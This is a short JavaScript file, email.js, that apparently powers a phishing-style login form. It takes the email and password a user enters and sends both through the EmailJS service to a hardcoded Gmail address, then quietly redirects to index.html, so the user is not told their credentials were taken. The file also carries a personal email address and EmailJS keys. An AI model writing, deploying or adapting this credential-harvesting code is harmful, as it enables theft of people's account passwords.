// email.js
// Initialize EmailJS with your user ID
emailjs.init("fIm1jWIwQ5JUuWTWw");

document.getElementById("form").addEventListener("submit", function (event) {
    event.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('pw').value.trim();
    const btn = document.getElementById("button");

    if (!email || !password) {
        alert('Please fill in all fields.');
        return;
    }

    btn.textContent = "Sending...";
    const serviceID = "service_mdo5ftd";
    const templateID = "template_mfvcvkc";

    // Sending email data including the recipient email
    const templateParams = {
        to_email: "alexbt2636@gmail.com",  // Replace with your recipient email
        from_email: email,
        password: password
    };

    emailjs.send(serviceID, templateID, templateParams).then(
        () => {
            btn.textContent = "Send Email";
            window.location.href = "index.html";  // Redirect after successful send
        },
        (err) => {
            btn.textContent = "Send Email";
            alert(JSON.stringify(err));
        }
    );
});
